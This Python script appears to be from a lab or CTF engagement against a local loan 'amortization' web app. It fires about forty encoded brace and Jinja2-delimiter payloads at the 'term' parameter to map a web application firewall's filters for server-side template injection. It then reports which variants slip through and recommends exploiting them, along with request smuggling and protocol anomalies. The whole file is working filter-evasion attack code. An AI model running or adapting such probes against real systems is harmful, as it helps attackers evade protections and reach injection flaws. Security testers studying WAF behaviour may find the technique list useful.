import requests
import urllib.parse
import time

# Target URL
target_url = "http://127.0.0.1:33207/amortization"

# Test more advanced encoding techniques
# Format: (payload_name, payload, description)
test_payloads = [
    # Unicode normalization bypasses
    ("unicode_open_brace", "\u007B", "Unicode escape sequence open brace"),
    ("unicode_close_brace", "\u007D", "Unicode escape sequence close brace"),
    ("unicode_both", "\u007B\u007D", "Unicode both braces"),
    
    # UTF-8 overlong encoding (2-byte)
    ("utf8_overlong_2b_open", "%C0%9B", "UTF-8 2-byte overlong open brace (0x7B)"),
    ("utf8_overlong_2b_close", "%C0%9D", "UTF-8 2-byte overlong close brace (0x7D)"),
    
    # UTF-8 overlong encoding (3-byte)
    ("utf8_overlong_3b_open", "%E0%80%9B", "UTF-8 3-byte overlong open brace"),
    ("utf8_overlong_3b_close", "%E0%80%9D", "UTF-8 3-byte overlong close brace"),
    
    # UTF-8 overlong encoding (4-byte)
    ("utf8_overlong_4b_open", "%F0%80%80%9B", "UTF-8 4-byte overlong open brace"),
    ("utf8_overlong_4b_close", "%F0%80%80%9D", "UTF-8 4-byte overlong close brace"),
    
    # Backslash escaping
    ("backslash_escaped_open", "\\{", "Backslash escaped open brace"),
    ("backslash_escaped_close", "\\}", "Backslash escaped close brace"),
    ("double_backslash_open", "\\\\{", "Double backslash before open brace"),
    ("double_backslash_close", "\\\\}", "Double backslash before close brace"),
    
    # Zero-width characters
    ("zwsp_before_open", "​{", "Zero-width space before open brace (U+200B)"),
    ("zwsp_after_open", "{​", "Zero-width space after open brace"),
    ("zwsp_before_close", "​}", "Zero-width space before close brace"),
    ("zwsp_after_close", "}​", "Zero-width space after close brace"),
    
    # Unicode combining characters
    ("combining_before_open", "\u0300{", "Combining grave accent before open"),
    ("combining_after_open", "{\u0300", "Combining grave accent after open"),
    
    # C-style octal encoding
    ("octal_open", "\173", "Octal encoding of open brace (0173)"),
    ("octal_close", "\175", "Octal encoding of close brace (0175)"),
    
    # XML entity encoding
    ("xml_entity_open", "&lbrace;", "XML entity for open brace"),
    ("xml_entity_close", "&rbrace;", "XML entity for close brace"),
    
    # HTML5 entity encoding
    ("html5_entity_open", "&lcub;", "HTML5 entity for open brace"),
    ("html5_entity_close", "&rcub;", "HTML5 entity for close brace"),
    
    # Base64 encoding of the entire payload
    ("base64_ssti", "JXNCNyUyQTclN0Q=", "Base64 of URL-encoded SSTI"),
    
    # Tab and newline obfuscation
    ("tab_before_open", "\t{", "Tab character before open brace"),
    ("newline_before_open", "\n{", "Newline before open brace"),
    ("carriage_return_open", "\r{", "Carriage return before open brace"),
    
    # Form feed and vertical tab
    ("form_feed_open", "\f{", "Form feed before open brace"),
    ("vertical_tab_open", "\v{", "Vertical tab before open brace"),
    
    # Alternative comment syntax
    ("comment_jinja2", "{# comment #}", "Jinja2 comment syntax"),
    ("comment_jinja2_encoded", "%7B%23%20comment%20%23%7D", "URL encoded Jinja2 comment"),
    
    # Alternative template delimiters
    ("jinja_var", "{{ }}", "Jinja2 variable (already tested)"),
    ("jinja_expr", "{% %}", "Jinja2 expression"),
    ("jinja_expr_encoded", "%7B%25%20%25%7D", "URL encoded Jinja2 expression"),
    
    # Python format string syntax
    ("fstring_open", "f'{", "Python f-string open"),
    ("format_open", "str.format({", "Python format string open"),
    
    # String concatenation approach
    ("concat_single", "'{'", "Single quoted open brace"),
    ("concat_double", '"{"', "Double quoted open brace"),
    
    # Character code access
    ("chr_open", "chr(123)", "chr() function for open brace"),
    ("chr_close", "chr(125)", "chr() function for close brace"),
]

# Store results
results = []
session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
})

print("=" * 80)
print("WAF FILTER MAPPING - ADVANCED TECHNIQUES")
print("=" * 80)
print(f"Target: {target_url}")
print(f"Total test payloads: {len(test_payloads)}")
print("=" * 80)

# Run tests
for i, (payload_name, payload, description) in enumerate(test_payloads, 1):
    print(f"\n[{i}/{len(test_payloads)}] Testing: {payload_name}")
    print(f"Description: {description}")
    print(f"Payload: {repr(payload)}")
    
    try:
        # Send GET request with payload in term parameter
        params = {'term': payload}
        response = session.get(target_url, params=params, timeout=10)
        
        # Extract response data
        status_code = response.status_code
        response_text = response.text[:500] if len(response.text) > 500 else response.text
        
        # Determine if blocked
        blocked = status_code == 400
        
        print(f"Status: {status_code}")
        print(f"Blocked: {blocked}")
        print(f"Response preview: {response_text[:100]}...")
        
        # Store result
        results.append({
            'payload_name': payload_name,
            'payload': payload,
            'description': description,
            'status_code': status_code,
            'blocked': blocked,
            'response_preview': response_text,
            'payload_repr': repr(payload)
        })
        
    except requests.exceptions.Timeout:
        print("[!] Request timed out")
        results.append({
            'payload_name': payload_name,
            'payload': payload,
            'description': description,
            'status_code': 'TIMEOUT',
            'blocked': None,
            'response_preview': 'TIMEOUT',
            'payload_repr': repr(payload)
        })
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        results.append({
            'payload_name': payload_name,
            'payload': payload,
            'description': description,
            'status_code': 'ERROR',
            'blocked': None,
            'response_preview': str(e),
            'payload_repr': repr(payload)
        })
    
    # Small delay to avoid rate limiting
    time.sleep(0.1)

# Generate summary report
print("\n" + "=" * 80)
print("ADVANCED FILTER SUMMARY REPORT")
print("=" * 80)

# Count blocked vs allowed
blocked_count = sum(1 for r in results if r['blocked'] == True)
allowed_count = sum(1 for r in results if r['blocked'] == False)
unknown_count = sum(1 for r in results if r['blocked'] is None)

print(f"Total tests: {len(results)}")
print(f"Blocked (400): {blocked_count}")
print(f"Allowed (non-400): {allowed_count}")
print(f"Unknown/Error: {unknown_count}")
print("\n" + "=" * 80)

# Print blocked patterns
print("BLOCKED PATTERNS:")
print("=" * 80)
for result in results:
    if result['blocked'] == True:
        print(f"❌ {result['payload_name']:25} | Status: {result['status_code']} | {result['description']}")

print("\n" + "=" * 80)
print("ALLOWED PATTERNS:")
print("=" * 80)
for result in results:
    if result['blocked'] == False:
        print(f"✓ {result['payload_name']:25} | Status: {result['status_code']} | {result['description']}")
        print(f"  Payload: {result['payload_repr']}")

print("\n" + "=" * 80)
print("UNKNOWN/ERRORS:")
print("=" * 80)
for result in results:
    if result['blocked'] is None:
        print(f"? {result['payload_name']:25} | Status: {result['status_code']} | {result['description']}")
        print(f"  Error: {result['response_preview']}")

# Categorize results
def categorize_results(results):
    categories = {
        "Unicode": [],
        "UTF-8 Overlong": [],
        "Backslash": [],
        "Whitespace": [],
        "Octal/XML": [],
        "Comments/Templates": [],
        "Other": []
    }
    
    for r in results:
        name = r['payload_name']
        if 'unicode' in name:
            categories["Unicode"].append(r)
        elif 'utf8' in name:
            categories["UTF-8 Overlong"].append(r)
        elif 'backslash' in name or 'double_backslash' in name:
            categories["Backslash"].append(r)
        elif any(x in name for x in ['tab', 'newline', 'carriage', 'form_feed', 'vertical', 'zwsp', 'combining']):
            categories["Whitespace"].append(r)
        elif any(x in name for x in ['octal', 'xml_entity', 'html5_entity', 'base64', 'chr']):
            categories["Octal/XML"].append(r)
        elif any(x in name for x in ['comment', 'jinja']):
            categories["Comments/Templates"].append(r)
        else:
            categories["Other"].append(r)
    
    return categories

print("\n" + "=" * 80)
print("DETAILED RESULTS BY CATEGORY")
print("=" * 80)

categories = categorize_results(results)

for category_name, category_results in categories.items():
    if category_results:
        blocked_in_cat = sum(1 for r in category_results if r['blocked'] == True)
        allowed_in_cat = sum(1 for r in category_results if r['blocked'] == False)
        
        print(f"\n{category_name} ({allowed_in_cat} allowed, {blocked_in_cat} blocked):")
        print("-" * 50)
        for r in category_results:
            status = "BLOCKED" if r['blocked'] else "ALLOWED"
            print(f"  {status:8} | {r['payload_name']:25} | {r['payload']}")

# Check for any successful brace bypasses
print("\n" + "=" * 80)
print("BRACE BYPASS ANALYSIS")
print("=" * 80)

successful_bypasses = []
for result in results:
    if result['blocked'] == False:
        # Check if payload contains brace-like characters
        payload = result['payload']
        has_brace = '{' in payload or '}' in payload
        has_encoded_brace = any(x in payload for x in ['\u007B', '\u007D', '\173', '\175'])
        
        if has_brace or has_encoded_brace:
            successful_bypasses.append(result)

if successful_bypasses:
    print("\n✓ SUCCESSFUL BRACE BYPASSES:")
    for bypass in successful_bypasses:
        print(f"  - {bypass['payload_name']}: {bypass['payload_repr']}")
else:
    print("\n❌ NO BRACE BYPASSES FOUND")
    print("  All brace-related payloads were blocked by the WAF")

# Final recommendations
print("\n" + "=" * 80)
print("FINAL FILTER ASSESSMENT")
print("=" * 80)

if successful_bypasses:
    print("\n✓ PARTIAL BYPASS ACHIEVED")
    print("  The WAF can be bypassed with advanced encoding techniques.")
    print("  Recommend focusing on successful bypass vectors for exploitation.")
else:
    print("\n❌ COMPREHENSIVE BLOCKING DETECTED")
    print("  The WAF successfully blocked ALL test payloads including:")
    print("  - Standard URL/HTML encoding")
    print("  - Unicode and UTF-8 overlong sequences")
    print("  - Backslash escaping")
    print("  - Whitespace obfuscation")
    print("  - Comment and template syntax")
    print("\n  Recommendations:")
    print("  1. Test the application logic directly (bypass WAF context)")
    print("  2. Try request smuggling if multiple frontends exist")
    print("  3. Test for WAF bypasses via HTTP protocol anomalies")
    print("  4. Review if WAF checks all parameters or only 'term'")

print("\n" + "=" * 80)
print("ADVANCED FILTER MAPPING COMPLETE")
print("=" * 80)
